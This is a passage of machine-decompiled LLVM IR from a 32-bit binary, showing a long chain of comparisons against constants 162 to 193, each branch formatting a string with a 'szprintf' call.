  store i32 %v1_804c17d, i32* @edx, align 4
  %v0_804c187 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c187 = zext i8 %v0_804c187 to i32
  %v2_804c196 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c196, i32* @ebx, align 4
  %v4_804c1a8 = call i32 @szprintf(i32 %v2_804c196, i32 ptrtoint ([14 x i8]* @global_var_805910b.195 to i32), i32 %v1_804c187)
  br label %dec_label_pc_804c1ad

dec_label_pc_804c1ad:                             ; preds = %dec_label_pc_804c174, %dec_label_pc_804c17d
  %v13_804c1ad = icmp eq i32 %v2_8049efa, 162
  %v1_804c1b4 = icmp eq i1 %v13_804c1ad, false
  br i1 %v1_804c1b4, label %dec_label_pc_804c1e6, label %dec_label_pc_804c1b6

dec_label_pc_804c1b6:                             ; preds = %dec_label_pc_804c1ad
  %v0_804c1b6 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c1b6 = zext i8 %v0_804c1b6 to i32
  store i32 %v1_804c1b6, i32* @edx, align 4
  %v0_804c1c0 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c1c0 = zext i8 %v0_804c1c0 to i32
  %v2_804c1cf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c1cf, i32* @ebx, align 4
  %v4_804c1e1 = call i32 @szprintf(i32 %v2_804c1cf, i32 ptrtoint ([14 x i8]* @global_var_8059119.196 to i32), i32 %v1_804c1c0)
  br label %dec_label_pc_804c1e6

dec_label_pc_804c1e6:                             ; preds = %dec_label_pc_804c1ad, %dec_label_pc_804c1b6
  %v13_804c1e6 = icmp eq i32 %v2_8049efa, 163
  %v1_804c1ed = icmp eq i1 %v13_804c1e6, false
  br i1 %v1_804c1ed, label %dec_label_pc_804c21f, label %dec_label_pc_804c1ef

dec_label_pc_804c1ef:                             ; preds = %dec_label_pc_804c1e6
  %v0_804c1ef = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c1ef = zext i8 %v0_804c1ef to i32
  store i32 %v1_804c1ef, i32* @edx, align 4
  %v0_804c1f9 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c1f9 = zext i8 %v0_804c1f9 to i32
  %v2_804c208 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c208, i32* @ebx, align 4
  %v4_804c21a = call i32 @szprintf(i32 %v2_804c208, i32 ptrtoint ([14 x i8]* @global_var_8059127.197 to i32), i32 %v1_804c1f9)
  br label %dec_label_pc_804c21f

dec_label_pc_804c21f:                             ; preds = %dec_label_pc_804c1e6, %dec_label_pc_804c1ef
  %v13_804c21f = icmp eq i32 %v2_8049efa, 164
  %v1_804c226 = icmp eq i1 %v13_804c21f, false
  br i1 %v1_804c226, label %dec_label_pc_804c258, label %dec_label_pc_804c228

dec_label_pc_804c228:                             ; preds = %dec_label_pc_804c21f
  %v0_804c228 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c228 = zext i8 %v0_804c228 to i32
  store i32 %v1_804c228, i32* @edx, align 4
  %v0_804c232 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c232 = zext i8 %v0_804c232 to i32
  %v2_804c241 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c241, i32* @ebx, align 4
  %v4_804c253 = call i32 @szprintf(i32 %v2_804c241, i32 ptrtoint ([14 x i8]* @global_var_8059095.186 to i32), i32 %v1_804c232)
  br label %dec_label_pc_804c258

dec_label_pc_804c258:                             ; preds = %dec_label_pc_804c21f, %dec_label_pc_804c228
  %v13_804c258 = icmp eq i32 %v2_8049efa, 165
  %v1_804c25f = icmp eq i1 %v13_804c258, false
  br i1 %v1_804c25f, label %dec_label_pc_804c291, label %dec_label_pc_804c261

dec_label_pc_804c261:                             ; preds = %dec_label_pc_804c258
  %v0_804c261 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c261 = zext i8 %v0_804c261 to i32
  store i32 %v1_804c261, i32* @edx, align 4
  %v0_804c26b = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c26b = zext i8 %v0_804c26b to i32
  %v2_804c27a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c27a, i32* @ebx, align 4
  %v4_804c28c = call i32 @szprintf(i32 %v2_804c27a, i32 ptrtoint ([13 x i8]* @global_var_8059135.198 to i32), i32 %v1_804c26b)
  br label %dec_label_pc_804c291

dec_label_pc_804c291:                             ; preds = %dec_label_pc_804c258, %dec_label_pc_804c261
  %v13_804c291 = icmp eq i32 %v2_8049efa, 166
  %v1_804c298 = icmp eq i1 %v13_804c291, false
  br i1 %v1_804c298, label %dec_label_pc_804c2ca, label %dec_label_pc_804c29a

dec_label_pc_804c29a:                             ; preds = %dec_label_pc_804c291
  %v0_804c29a = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c29a = zext i8 %v0_804c29a to i32
  store i32 %v1_804c29a, i32* @edx, align 4
  %v0_804c2a4 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c2a4 = zext i8 %v0_804c2a4 to i32
  %v2_804c2b3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c2b3, i32* @ebx, align 4
  %v4_804c2c5 = call i32 @szprintf(i32 %v2_804c2b3, i32 ptrtoint ([14 x i8]* @global_var_8059142.199 to i32), i32 %v1_804c2a4)
  br label %dec_label_pc_804c2ca

dec_label_pc_804c2ca:                             ; preds = %dec_label_pc_804c291, %dec_label_pc_804c29a
  %v13_804c2ca = icmp eq i32 %v2_8049efa, 167
  %v1_804c2d1 = icmp eq i1 %v13_804c2ca, false
  br i1 %v1_804c2d1, label %dec_label_pc_804c303, label %dec_label_pc_804c2d3

dec_label_pc_804c2d3:                             ; preds = %dec_label_pc_804c2ca
  %v0_804c2d3 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c2d3 = zext i8 %v0_804c2d3 to i32
  store i32 %v1_804c2d3, i32* @edx, align 4
  %v0_804c2dd = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c2dd = zext i8 %v0_804c2dd to i32
  %v2_804c2ec = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c2ec, i32* @ebx, align 4
  %v4_804c2fe = call i32 @szprintf(i32 %v2_804c2ec, i32 ptrtoint ([14 x i8]* @global_var_80590f0.193 to i32), i32 %v1_804c2dd)
  br label %dec_label_pc_804c303

dec_label_pc_804c303:                             ; preds = %dec_label_pc_804c2ca, %dec_label_pc_804c2d3
  %v13_804c303 = icmp eq i32 %v2_8049efa, 168
  %v1_804c30a = icmp eq i1 %v13_804c303, false
  br i1 %v1_804c30a, label %dec_label_pc_804c33c, label %dec_label_pc_804c30c

dec_label_pc_804c30c:                             ; preds = %dec_label_pc_804c303
  %v0_804c30c = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c30c = zext i8 %v0_804c30c to i32
  store i32 %v1_804c30c, i32* @edx, align 4
  %v0_804c316 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c316 = zext i8 %v0_804c316 to i32
  %v2_804c325 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c325, i32* @ebx, align 4
  %v4_804c337 = call i32 @szprintf(i32 %v2_804c325, i32 ptrtoint ([14 x i8]* @global_var_8059150.200 to i32), i32 %v1_804c316)
  br label %dec_label_pc_804c33c

dec_label_pc_804c33c:                             ; preds = %dec_label_pc_804c303, %dec_label_pc_804c30c
  %v13_804c33c = icmp eq i32 %v2_8049efa, 169
  %v1_804c343 = icmp eq i1 %v13_804c33c, false
  br i1 %v1_804c343, label %dec_label_pc_804c375, label %dec_label_pc_804c345

dec_label_pc_804c345:                             ; preds = %dec_label_pc_804c33c
  %v0_804c345 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c345 = zext i8 %v0_804c345 to i32
  store i32 %v1_804c345, i32* @edx, align 4
  %v0_804c34f = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c34f = zext i8 %v0_804c34f to i32
  %v2_804c35e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c35e, i32* @ebx, align 4
  %v4_804c370 = call i32 @szprintf(i32 %v2_804c35e, i32 ptrtoint ([14 x i8]* @global_var_805915e.201 to i32), i32 %v1_804c34f)
  br label %dec_label_pc_804c375

dec_label_pc_804c375:                             ; preds = %dec_label_pc_804c33c, %dec_label_pc_804c345
  %v13_804c375 = icmp eq i32 %v2_8049efa, 171
  %v1_804c37c = icmp eq i1 %v13_804c375, false
  br i1 %v1_804c37c, label %dec_label_pc_804c3ae, label %dec_label_pc_804c37e

dec_label_pc_804c37e:                             ; preds = %dec_label_pc_804c375
  %v0_804c37e = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c37e = zext i8 %v0_804c37e to i32
  store i32 %v1_804c37e, i32* @edx, align 4
  %v0_804c388 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c388 = zext i8 %v0_804c388 to i32
  %v2_804c397 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c397, i32* @ebx, align 4
  %v4_804c3a9 = call i32 @szprintf(i32 %v2_804c397, i32 ptrtoint ([14 x i8]* @global_var_805916c.202 to i32), i32 %v1_804c388)
  br label %dec_label_pc_804c3ae

dec_label_pc_804c3ae:                             ; preds = %dec_label_pc_804c375, %dec_label_pc_804c37e
  %v13_804c3ae = icmp eq i32 %v2_8049efa, 172
  %v1_804c3b5 = icmp eq i1 %v13_804c3ae, false
  br i1 %v1_804c3b5, label %dec_label_pc_804c3e7, label %dec_label_pc_804c3b7

dec_label_pc_804c3b7:                             ; preds = %dec_label_pc_804c3ae
  %v0_804c3b7 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c3b7 = zext i8 %v0_804c3b7 to i32
  store i32 %v1_804c3b7, i32* @edx, align 4
  %v0_804c3c1 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c3c1 = zext i8 %v0_804c3c1 to i32
  %v2_804c3d0 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c3d0, i32* @ebx, align 4
  %v4_804c3e2 = call i32 @szprintf(i32 %v2_804c3d0, i32 ptrtoint ([14 x i8]* @global_var_805917a.203 to i32), i32 %v1_804c3c1)
  br label %dec_label_pc_804c3e7

dec_label_pc_804c3e7:                             ; preds = %dec_label_pc_804c3ae, %dec_label_pc_804c3b7
  %v13_804c3e7 = icmp eq i32 %v2_8049efa, 173
  %v1_804c3ee = icmp eq i1 %v13_804c3e7, false
  br i1 %v1_804c3ee, label %dec_label_pc_804c420, label %dec_label_pc_804c3f0

dec_label_pc_804c3f0:                             ; preds = %dec_label_pc_804c3e7
  %v0_804c3f0 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c3f0 = zext i8 %v0_804c3f0 to i32
  store i32 %v1_804c3f0, i32* @edx, align 4
  %v0_804c3fa = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c3fa = zext i8 %v0_804c3fa to i32
  %v2_804c409 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c409, i32* @ebx, align 4
  %v4_804c41b = call i32 @szprintf(i32 %v2_804c409, i32 ptrtoint ([14 x i8]* @global_var_8059188.204 to i32), i32 %v1_804c3fa)
  br label %dec_label_pc_804c420

dec_label_pc_804c420:                             ; preds = %dec_label_pc_804c3e7, %dec_label_pc_804c3f0
  %v13_804c420 = icmp eq i32 %v2_8049efa, 174
  %v1_804c427 = icmp eq i1 %v13_804c420, false
  br i1 %v1_804c427, label %dec_label_pc_804c459, label %dec_label_pc_804c429

dec_label_pc_804c429:                             ; preds = %dec_label_pc_804c420
  %v0_804c429 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c429 = zext i8 %v0_804c429 to i32
  store i32 %v1_804c429, i32* @edx, align 4
  %v0_804c433 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c433 = zext i8 %v0_804c433 to i32
  %v2_804c442 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c442, i32* @ebx, align 4
  %v4_804c454 = call i32 @szprintf(i32 %v2_804c442, i32 ptrtoint ([13 x i8]* @global_var_8059196.205 to i32), i32 %v1_804c433)
  br label %dec_label_pc_804c459

dec_label_pc_804c459:                             ; preds = %dec_label_pc_804c420, %dec_label_pc_804c429
  %v13_804c459 = icmp eq i32 %v2_8049efa, 175
  %v1_804c460 = icmp eq i1 %v13_804c459, false
  br i1 %v1_804c460, label %dec_label_pc_804c492, label %dec_label_pc_804c462

dec_label_pc_804c462:                             ; preds = %dec_label_pc_804c459
  %v0_804c462 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c462 = zext i8 %v0_804c462 to i32
  store i32 %v1_804c462, i32* @edx, align 4
  %v0_804c46c = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c46c = zext i8 %v0_804c46c to i32
  %v2_804c47b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c47b, i32* @ebx, align 4
  %v4_804c48d = call i32 @szprintf(i32 %v2_804c47b, i32 ptrtoint ([14 x i8]* @global_var_80591a3.206 to i32), i32 %v1_804c46c)
  br label %dec_label_pc_804c492

dec_label_pc_804c492:                             ; preds = %dec_label_pc_804c459, %dec_label_pc_804c462
  %v10_804c492 = icmp eq i32 %v2_8049efa, 176
  %v1_804c499 = icmp eq i1 %v10_804c492, false
  br i1 %v1_804c499, label %dec_label_pc_804c4cb, label %dec_label_pc_804c49b

dec_label_pc_804c49b:                             ; preds = %dec_label_pc_804c492
  %v0_804c49b = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c49b = zext i8 %v0_804c49b to i32
  store i32 %v1_804c49b, i32* @edx, align 4
  %v0_804c4a5 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c4a5 = zext i8 %v0_804c4a5 to i32
  %v2_804c4b4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c4b4, i32* @ebx, align 4
  %v4_804c4c6 = call i32 @szprintf(i32 %v2_804c4b4, i32 ptrtoint ([14 x i8]* @global_var_80591b1.207 to i32), i32 %v1_804c4a5)
  br label %dec_label_pc_804c4cb

dec_label_pc_804c4cb:                             ; preds = %dec_label_pc_804c492, %dec_label_pc_804c49b
  %v13_804c4cb = icmp eq i32 %v2_8049efa, 177
  %v1_804c4d2 = icmp eq i1 %v13_804c4cb, false
  br i1 %v1_804c4d2, label %dec_label_pc_804c504, label %dec_label_pc_804c4d4

dec_label_pc_804c4d4:                             ; preds = %dec_label_pc_804c4cb
  %v0_804c4d4 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c4d4 = zext i8 %v0_804c4d4 to i32
  store i32 %v1_804c4d4, i32* @edx, align 4
  %v0_804c4de = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c4de = zext i8 %v0_804c4de to i32
  %v2_804c4ed = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c4ed, i32* @ebx, align 4
  %v4_804c4ff = call i32 @szprintf(i32 %v2_804c4ed, i32 ptrtoint ([14 x i8]* @global_var_80591bf.208 to i32), i32 %v1_804c4de)
  br label %dec_label_pc_804c504

dec_label_pc_804c504:                             ; preds = %dec_label_pc_804c4cb, %dec_label_pc_804c4d4
  %v13_804c504 = icmp eq i32 %v2_8049efa, 178
  %v1_804c50b = icmp eq i1 %v13_804c504, false
  br i1 %v1_804c50b, label %dec_label_pc_804c53d, label %dec_label_pc_804c50d

dec_label_pc_804c50d:                             ; preds = %dec_label_pc_804c504
  %v0_804c50d = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c50d = zext i8 %v0_804c50d to i32
  store i32 %v1_804c50d, i32* @edx, align 4
  %v0_804c517 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c517 = zext i8 %v0_804c517 to i32
  %v2_804c526 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c526, i32* @ebx, align 4
  %v4_804c538 = call i32 @szprintf(i32 %v2_804c526, i32 ptrtoint ([13 x i8]* @global_var_80591cd.209 to i32), i32 %v1_804c517)
  br label %dec_label_pc_804c53d

dec_label_pc_804c53d:                             ; preds = %dec_label_pc_804c504, %dec_label_pc_804c50d
  %v13_804c53d = icmp eq i32 %v2_8049efa, 179
  %v1_804c544 = icmp eq i1 %v13_804c53d, false
  br i1 %v1_804c544, label %dec_label_pc_804c576, label %dec_label_pc_804c546

dec_label_pc_804c546:                             ; preds = %dec_label_pc_804c53d
  %v0_804c546 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c546 = zext i8 %v0_804c546 to i32
  store i32 %v1_804c546, i32* @edx, align 4
  %v0_804c550 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c550 = zext i8 %v0_804c550 to i32
  %v2_804c55f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c55f, i32* @ebx, align 4
  %v4_804c571 = call i32 @szprintf(i32 %v2_804c55f, i32 ptrtoint ([13 x i8]* @global_var_80591da.210 to i32), i32 %v1_804c550)
  br label %dec_label_pc_804c576

dec_label_pc_804c576:                             ; preds = %dec_label_pc_804c53d, %dec_label_pc_804c546
  %v13_804c576 = icmp eq i32 %v2_8049efa, 180
  %v1_804c57d = icmp eq i1 %v13_804c576, false
  br i1 %v1_804c57d, label %dec_label_pc_804c5af, label %dec_label_pc_804c57f

dec_label_pc_804c57f:                             ; preds = %dec_label_pc_804c576
  %v0_804c57f = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c57f = zext i8 %v0_804c57f to i32
  store i32 %v1_804c57f, i32* @edx, align 4
  %v0_804c589 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c589 = zext i8 %v0_804c589 to i32
  %v2_804c598 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c598, i32* @ebx, align 4
  %v4_804c5aa = call i32 @szprintf(i32 %v2_804c598, i32 ptrtoint ([13 x i8]* @global_var_80591e7.211 to i32), i32 %v1_804c589)
  br label %dec_label_pc_804c5af

dec_label_pc_804c5af:                             ; preds = %dec_label_pc_804c576, %dec_label_pc_804c57f
  %v13_804c5af = icmp eq i32 %v2_8049efa, 181
  %v1_804c5b6 = icmp eq i1 %v13_804c5af, false
  br i1 %v1_804c5b6, label %dec_label_pc_804c5e8, label %dec_label_pc_804c5b8

dec_label_pc_804c5b8:                             ; preds = %dec_label_pc_804c5af
  %v0_804c5b8 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c5b8 = zext i8 %v0_804c5b8 to i32
  store i32 %v1_804c5b8, i32* @edx, align 4
  %v0_804c5c2 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c5c2 = zext i8 %v0_804c5c2 to i32
  %v2_804c5d1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c5d1, i32* @ebx, align 4
  %v4_804c5e3 = call i32 @szprintf(i32 %v2_804c5d1, i32 ptrtoint ([13 x i8]* @global_var_80591f4.212 to i32), i32 %v1_804c5c2)
  br label %dec_label_pc_804c5e8

dec_label_pc_804c5e8:                             ; preds = %dec_label_pc_804c5af, %dec_label_pc_804c5b8
  %v13_804c5e8 = icmp eq i32 %v2_8049efa, 182
  %v1_804c5ef = icmp eq i1 %v13_804c5e8, false
  br i1 %v1_804c5ef, label %dec_label_pc_804c621, label %dec_label_pc_804c5f1

dec_label_pc_804c5f1:                             ; preds = %dec_label_pc_804c5e8
  %v0_804c5f1 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c5f1 = zext i8 %v0_804c5f1 to i32
  store i32 %v1_804c5f1, i32* @edx, align 4
  %v0_804c5fb = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c5fb = zext i8 %v0_804c5fb to i32
  %v2_804c60a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c60a, i32* @ebx, align 4
  %v4_804c61c = call i32 @szprintf(i32 %v2_804c60a, i32 ptrtoint ([13 x i8]* @global_var_8059201.213 to i32), i32 %v1_804c5fb)
  br label %dec_label_pc_804c621

dec_label_pc_804c621:                             ; preds = %dec_label_pc_804c5e8, %dec_label_pc_804c5f1
  %v13_804c621 = icmp eq i32 %v2_8049efa, 183
  %v1_804c628 = icmp eq i1 %v13_804c621, false
  br i1 %v1_804c628, label %dec_label_pc_804c65a, label %dec_label_pc_804c62a

dec_label_pc_804c62a:                             ; preds = %dec_label_pc_804c621
  %v0_804c62a = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c62a = zext i8 %v0_804c62a to i32
  store i32 %v1_804c62a, i32* @edx, align 4
  %v0_804c634 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c634 = zext i8 %v0_804c634 to i32
  %v2_804c643 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c643, i32* @ebx, align 4
  %v4_804c655 = call i32 @szprintf(i32 %v2_804c643, i32 ptrtoint ([13 x i8]* @global_var_8058b4c.84 to i32), i32 %v1_804c634)
  br label %dec_label_pc_804c65a

dec_label_pc_804c65a:                             ; preds = %dec_label_pc_804c621, %dec_label_pc_804c62a
  %v13_804c65a = icmp eq i32 %v2_8049efa, 184
  %v1_804c661 = icmp eq i1 %v13_804c65a, false
  br i1 %v1_804c661, label %dec_label_pc_804c693, label %dec_label_pc_804c663

dec_label_pc_804c663:                             ; preds = %dec_label_pc_804c65a
  %v0_804c663 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c663 = zext i8 %v0_804c663 to i32
  store i32 %v1_804c663, i32* @edx, align 4
  %v0_804c66d = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c66d = zext i8 %v0_804c66d to i32
  %v2_804c67c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c67c, i32* @ebx, align 4
  %v4_804c68e = call i32 @szprintf(i32 %v2_804c67c, i32 ptrtoint ([13 x i8]* @global_var_805920e.214 to i32), i32 %v1_804c66d)
  br label %dec_label_pc_804c693

dec_label_pc_804c693:                             ; preds = %dec_label_pc_804c65a, %dec_label_pc_804c663
  %v13_804c693 = icmp eq i32 %v2_8049efa, 185
  %v1_804c69a = icmp eq i1 %v13_804c693, false
  br i1 %v1_804c69a, label %dec_label_pc_804c6cc, label %dec_label_pc_804c69c

dec_label_pc_804c69c:                             ; preds = %dec_label_pc_804c693
  %v0_804c69c = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c69c = zext i8 %v0_804c69c to i32
  store i32 %v1_804c69c, i32* @edx, align 4
  %v0_804c6a6 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c6a6 = zext i8 %v0_804c6a6 to i32
  %v2_804c6b5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c6b5, i32* @ebx, align 4
  %v4_804c6c7 = call i32 @szprintf(i32 %v2_804c6b5, i32 ptrtoint ([13 x i8]* @global_var_805921b.215 to i32), i32 %v1_804c6a6)
  br label %dec_label_pc_804c6cc

dec_label_pc_804c6cc:                             ; preds = %dec_label_pc_804c693, %dec_label_pc_804c69c
  %v13_804c6cc = icmp eq i32 %v2_8049efa, 186
  %v1_804c6d3 = icmp eq i1 %v13_804c6cc, false
  br i1 %v1_804c6d3, label %dec_label_pc_804c705, label %dec_label_pc_804c6d5

dec_label_pc_804c6d5:                             ; preds = %dec_label_pc_804c6cc
  %v0_804c6d5 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c6d5 = zext i8 %v0_804c6d5 to i32
  store i32 %v1_804c6d5, i32* @edx, align 4
  %v0_804c6df = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c6df = zext i8 %v0_804c6df to i32
  %v2_804c6ee = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c6ee, i32* @ebx, align 4
  %v4_804c700 = call i32 @szprintf(i32 %v2_804c6ee, i32 ptrtoint ([14 x i8]* @global_var_8059228.216 to i32), i32 %v1_804c6df)
  br label %dec_label_pc_804c705

dec_label_pc_804c705:                             ; preds = %dec_label_pc_804c6cc, %dec_label_pc_804c6d5
  %v13_804c705 = icmp eq i32 %v2_8049efa, 187
  %v1_804c70c = icmp eq i1 %v13_804c705, false
  br i1 %v1_804c70c, label %dec_label_pc_804c73e, label %dec_label_pc_804c70e

dec_label_pc_804c70e:                             ; preds = %dec_label_pc_804c705
  %v0_804c70e = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c70e = zext i8 %v0_804c70e to i32
  store i32 %v1_804c70e, i32* @edx, align 4
  %v0_804c718 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c718 = zext i8 %v0_804c718 to i32
  %v2_804c727 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c727, i32* @ebx, align 4
  %v4_804c739 = call i32 @szprintf(i32 %v2_804c727, i32 ptrtoint ([14 x i8]* @global_var_8059236.217 to i32), i32 %v1_804c718)
  br label %dec_label_pc_804c73e

dec_label_pc_804c73e:                             ; preds = %dec_label_pc_804c705, %dec_label_pc_804c70e
  %v13_804c73e = icmp eq i32 %v2_8049efa, 188
  %v1_804c745 = icmp eq i1 %v13_804c73e, false
  br i1 %v1_804c745, label %dec_label_pc_804c777, label %dec_label_pc_804c747

dec_label_pc_804c747:                             ; preds = %dec_label_pc_804c73e
  %v0_804c747 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c747 = zext i8 %v0_804c747 to i32
  store i32 %v1_804c747, i32* @edx, align 4
  %v0_804c751 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c751 = zext i8 %v0_804c751 to i32
  %v2_804c760 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c760, i32* @ebx, align 4
  %v4_804c772 = call i32 @szprintf(i32 %v2_804c760, i32 ptrtoint ([14 x i8]* @global_var_8059244.218 to i32), i32 %v1_804c751)
  br label %dec_label_pc_804c777

dec_label_pc_804c777:                             ; preds = %dec_label_pc_804c73e, %dec_label_pc_804c747
  %v13_804c777 = icmp eq i32 %v2_8049efa, 189
  %v1_804c77e = icmp eq i1 %v13_804c777, false
  br i1 %v1_804c77e, label %dec_label_pc_804c7b0, label %dec_label_pc_804c780

dec_label_pc_804c780:                             ; preds = %dec_label_pc_804c777
  %v0_804c780 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c780 = zext i8 %v0_804c780 to i32
  store i32 %v1_804c780, i32* @edx, align 4
  %v0_804c78a = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c78a = zext i8 %v0_804c78a to i32
  %v2_804c799 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c799, i32* @ebx, align 4
  %v4_804c7ab = call i32 @szprintf(i32 %v2_804c799, i32 ptrtoint ([14 x i8]* @global_var_8059252.219 to i32), i32 %v1_804c78a)
  br label %dec_label_pc_804c7b0

dec_label_pc_804c7b0:                             ; preds = %dec_label_pc_804c777, %dec_label_pc_804c780
  %v13_804c7b0 = icmp eq i32 %v2_8049efa, 190
  %v1_804c7b7 = icmp eq i1 %v13_804c7b0, false
  br i1 %v1_804c7b7, label %dec_label_pc_804c7e9, label %dec_label_pc_804c7b9

dec_label_pc_804c7b9:                             ; preds = %dec_label_pc_804c7b0
  %v0_804c7b9 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c7b9 = zext i8 %v0_804c7b9 to i32
  store i32 %v1_804c7b9, i32* @edx, align 4
  %v0_804c7c3 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c7c3 = zext i8 %v0_804c7c3 to i32
  %v2_804c7d2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c7d2, i32* @ebx, align 4
  %v4_804c7e4 = call i32 @szprintf(i32 %v2_804c7d2, i32 ptrtoint ([14 x i8]* @global_var_8059260.220 to i32), i32 %v1_804c7c3)
  br label %dec_label_pc_804c7e9

dec_label_pc_804c7e9:                             ; preds = %dec_label_pc_804c7b0, %dec_label_pc_804c7b9
  %v13_804c7e9 = icmp eq i32 %v2_8049efa, 191
  %v1_804c7f0 = icmp eq i1 %v13_804c7e9, false
  br i1 %v1_804c7f0, label %dec_label_pc_804c822, label %dec_label_pc_804c7f2

dec_label_pc_804c7f2:                             ; preds = %dec_label_pc_804c7e9
  %v0_804c7f2 = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c7f2 = zext i8 %v0_804c7f2 to i32
  store i32 %v1_804c7f2, i32* @edx, align 4
  %v0_804c7fc = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c7fc = zext i8 %v0_804c7fc to i32
  %v2_804c80b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c80b, i32* @ebx, align 4
  %v4_804c81d = call i32 @szprintf(i32 %v2_804c80b, i32 ptrtoint ([14 x i8]* @global_var_805926e.221 to i32), i32 %v1_804c7fc)
  br label %dec_label_pc_804c822

dec_label_pc_804c822:                             ; preds = %dec_label_pc_804c7e9, %dec_label_pc_804c7f2
  %v10_804c822 = icmp eq i32 %v2_8049efa, 192
  %v1_804c829 = icmp eq i1 %v10_804c822, false
  br i1 %v1_804c829, label %dec_label_pc_804c85b, label %dec_label_pc_804c82b

dec_label_pc_804c82b:                             ; preds = %dec_label_pc_804c822
  %v0_804c82b = load i8, i8* @global_var_805c53a.41, align 2
  %v1_804c82b = zext i8 %v0_804c82b to i32
  store i32 %v1_804c82b, i32* @edx, align 4
  %v0_804c835 = load i8, i8* @global_var_805c539.40, align 1
  %v1_804c835 = zext i8 %v0_804c835 to i32
  %v2_804c844 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c844, i32* @ebx, align 4
  %v4_804c856 = call i32 @szprintf(i32 %v2_804c844, i32 ptrtoint ([13 x i8]* @global_var_805927c.222 to i32), i32 %v1_804c835)
  br label %dec_label_pc_804c85b

dec_label_pc_804c85b:                             ; preds = %dec_label_pc_804c822, %dec_label_pc_804c82b
  %v13_804c85b = icmp eq i32 %v2_8049efa, 193
  %v1_804c862 = icmp eq i1 %v13_804c85b, false
